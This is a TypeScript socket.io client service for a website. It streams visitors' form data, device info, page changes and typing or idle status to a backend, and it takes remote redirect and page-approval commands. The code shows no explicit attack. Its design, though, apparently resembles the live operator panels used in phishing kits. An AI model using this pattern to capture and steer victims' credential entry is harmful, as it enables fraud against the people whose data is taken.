import { io, Socket } from 'socket.io-client';
import { SOCKET_URL } from '../config';
import { getDeviceInfo, DeviceInfo } from '../utils/deviceInfo';

class SocketService {
  private socket: Socket | null = null;
  private sessionId: string = '';
  private deviceInfo: DeviceInfo | null = null;
  private redirectCallback: ((targetPage: string) => void) | null = null;
  private currentPage: string = 'home';
  private savingInProgress: { [key: string]: boolean } = {};

  // Initialize socket connection
  async connect(sessionId: string): Promise<Socket> {
    if (this.socket?.connected) {
      return this.socket;
    }

    this.sessionId = sessionId;
    
    // Get device info once on connect
    if (!this.deviceInfo) {
      this.deviceInfo = await getDeviceInfo();
    }
    
    this.socket = io(SOCKET_URL, {
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionAttempts: 5,
      secure: true,
    });

    this.setupEventListeners();
    
    // Wait for the socket to actually connect before resolving
    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error('Socket connection timeout'));
      }, 10000);
      
      this.socket!.on('connect', () => {
        clearTimeout(timeout);
        console.log('✅ [SocketService] Socket connected! ID:', this.socket!.id);
        resolve(this.socket!);
      });
      
      this.socket!.on('connect_error', (error) => {
        clearTimeout(timeout);
        console.error('❌ [SocketService] Connection error:', error);
        reject(error);
      });
    });
  }

  // Setup event listeners
  private setupEventListeners(): void {
    if (!this.socket) return;

    this.socket.on('connect', () => {
      console.log('✅ Connected to backend:', this.socket?.id);
      
      // Setup redirect listener on first connect
      if (this.redirectCallback) {
        console.log('🔄 Setting up redirect listener on connect');
        this.setupRedirectListener();
      }
      
      // Re-join room on reconnect
      if (this.sessionId && this.currentPage) {
        console.log('🔄 Reconnected! Re-joining room:', this.sessionId);
        this.joinAsVisitor(this.currentPage);
      }
    });

    this.socket.on('disconnect', () => {
      console.log('❌ Disconnected from backend');
    });

    this.socket.on('connect_error', (error) => {
      console.error('Connection error:', error);
    });

  }

  // Join as visitor
  joinAsVisitor(page: string): void {
    if (!this.socket?.connected) {
      console.warn('Socket not connected');
      return;
    }

    this.currentPage = page;
    this.socket.emit('visitor:join', {
      sessionId: this.sessionId,
      page,
      deviceInfo: this.deviceInfo,
    });
    console.log(`👤 Joined as visitor on page: ${page}`);
  }

  // Track page change
  trackPageChange(page: string): void {
    if (!this.socket?.connected) {
      console.warn('Socket not connected');
      return;
    }

    this.socket.emit('visitor:page-change', {
      sessionId: this.sessionId,
      page,
      deviceInfo: this.deviceInfo,
    });
    console.log(`📄 Page changed to: ${page}`);
  }

  // Save visitor data
  saveVisitorData(formData: any, page: string): void {
    if (!this.socket?.connected) {
      console.warn('Socket not connected');
      return;
    }

    // Lock: Check if save is already in progress for this page
    if (this.savingInProgress[page]) {
      console.log(`⚠️ Locked: Ignoring duplicate save for ${page} (save already in progress)`);
      return;
    }

    // Set lock
    this.savingInProgress[page] = true;

    // Release lock after a short delay to allow the save to complete
    setTimeout(() => {
      this.savingInProgress[page] = false;
    }, 500);

    this.socket.emit('visitor:save-data', {
      sessionId: this.sessionId,
      formData,
      page,
      deviceInfo: this.deviceInfo,
    });
    console.log(`💾 Data saved for page: ${page}`);
  }

  // Setup redirect listener (internal method)
  private setupRedirectListener(): void {
    if (!this.socket) return;

    // Remove any existing listener first
    this.socket.off('visitor:redirect');

    // Add new listener
    this.socket.on('visitor:redirect', (data: { targetPage: string }) => {
      console.log("🔄 [LISTENER] Redirect command received:", data.targetPage);
      if (this.redirectCallback) {
        console.log("🔄 [LISTENER] Calling callback");
        this.redirectCallback(data.targetPage);
      }
    });
  }

  // Listen for redirect commands
  onRedirect(callback: (targetPage: string) => void): void {
    console.log('🔧 [onRedirect] Setting up redirect listener');
    
    // Store the callback (even if socket is not ready yet)
    this.redirectCallback = callback;
    console.log('✅ [onRedirect] Callback stored');

    // If socket is already connected, setup listener immediately
    if (this.socket?.connected) {
      console.log('✅ [onRedirect] Socket already connected, setting up listener now');
      this.setupRedirectListener();
      console.log('✅ [onRedirect] Listener registered successfully');
    } else {
      console.log('⏳ [onRedirect] Socket not connected yet, listener will be set up on connect');
    }
  }

  // Remove redirect listener
  offRedirect(): void {
    if (!this.socket) return;
    this.socket.off('visitor:redirect');
    this.redirectCallback = null;
  }

  // Disconnect
  disconnect(): void {
    if (this.socket) {
      this.socket.disconnect();
      this.socket = null;
    }
  }

  // Get socket instance
  getSocket(): Socket | null {
    return this.socket;
  }

  // Get session ID
  getSessionId(): string {
    return this.sessionId;
  }

  // Notify typing status
  notifyTyping(): void {
    if (!this.socket?.connected) return;
    this.socket.emit('visitor:typing', { sessionId: this.sessionId });
  }

  // Notify stopped typing
  notifyStoppedTyping(): void {
    if (!this.socket?.connected) return;
    this.socket.emit('visitor:stopped-typing', { sessionId: this.sessionId });
  }

  // Notify idle
  notifyIdle(): void {
    if (!this.socket?.connected) return;
    this.socket.emit('visitor:idle', { sessionId: this.sessionId });
  }

  // Request approval for a specific page
  requestApproval(page: string): void {
    if (!this.socket?.connected) {
      console.warn('Socket not connected');
      return;
    }

    this.socket.emit('visitor:request-approval', {
      sessionId: this.sessionId,
      page,
      deviceInfo: this.deviceInfo,
    });
    console.log(`🙏 Requested approval for page: ${page}`);
  }

  // Listen for approval decisions
  onApprovalDecision(callback: (decision: { decision: 'approved' | 'rejected'; page: string; reason?: string }) => void): void {
    if (!this.socket) return;

    this.socket.on('visitor:approval-decision', callback);
  }

  // Remove approval decision listener
  offApprovalDecision(): void {
    if (!this.socket) return;
    this.socket.off('visitor:approval-decision');
  }
}

// Export singleton instance
export const socketService = new SocketService();
